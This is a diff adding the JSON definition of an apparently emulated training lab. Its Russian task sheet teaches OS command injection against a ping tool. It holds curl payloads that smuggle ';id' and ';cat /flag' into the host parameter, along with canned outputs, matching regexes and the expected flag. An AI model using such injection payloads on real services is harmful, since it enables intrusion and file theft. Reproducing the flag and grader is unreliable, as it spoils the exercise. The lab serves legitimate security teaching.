@@ -1,0 +1,23 @@
+{
+  "id": "web-injection-basics",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{0s_c0mm4nd_1nj3ct10n_p1ngs_b4ck}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: три движка инъекций\n\nСервис «проверка сайта» принимает URL и пингует хост:\n\n```\nhttps://shop.local/tools/ping?host=shop.local\n```\n\nПриложение собирает системную команду конкатенацией: `ping -c1 <host>`.\n\n1. Убедись, что легитимный запрос работает:\n\n   curl -s 'https://shop.local/tools/ping?host=shop.local'\n\n2. Проверь инъекцию команд ОС через разделитель `;` (в URL — `%3B`):\n\n   curl -s 'https://shop.local/tools/ping?host=127.0.0.1%3Bid'\n\n3. Прочитай файл с флагом:\n\n   curl -s 'https://shop.local/tools/ping?host=127.0.0.1%3Bcat%20/flag' > found.txt\n\n4. Набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local/tools/ping)",
+      "cases": [
+        { "match": "cat\\s*[/+]?flag|%2Fflag|cat%20", "example": "-s 'https://shop.local/tools/ping?host=127.0.0.1%3Bcat%20/flag'", "output": "PING 127.0.0.1 (127.0.0.1): 56 data bytes\n64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.031 ms\nnto{0s_c0mm4nd_1nj3ct10n_p1ngs_b4ck}\n" },
+        { "match": "%3Bid|;id|%3B\\s*id", "example": "-s 'https://shop.local/tools/ping?host=127.0.0.1%3Bid'", "output": "PING 127.0.0.1 (127.0.0.1): 56 data bytes\n64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.028 ms\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n" },
+        { "match": "whoami", "example": "-s 'https://shop.local/tools/ping?host=127.0.0.1%3Bwhoami'", "output": "PING 127.0.0.1 (127.0.0.1): 56 data bytes\nwww-data\n" },
+        { "match": "127\\.0\\.0\\.1", "example": "-s 'https://shop.local/tools/ping?host=127.0.0.1'", "output": "PING 127.0.0.1 (127.0.0.1): 56 data bytes\n64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.030 ms\n" },
+        { "match": "shop\\.local", "example": "-s 'https://shop.local/tools/ping?host=shop.local'", "output": "PING shop.local (127.0.0.1): 56 data bytes\n64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.033 ms\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только https://shop.local/tools/ping?host=...\n"
+    }
+  }
+}
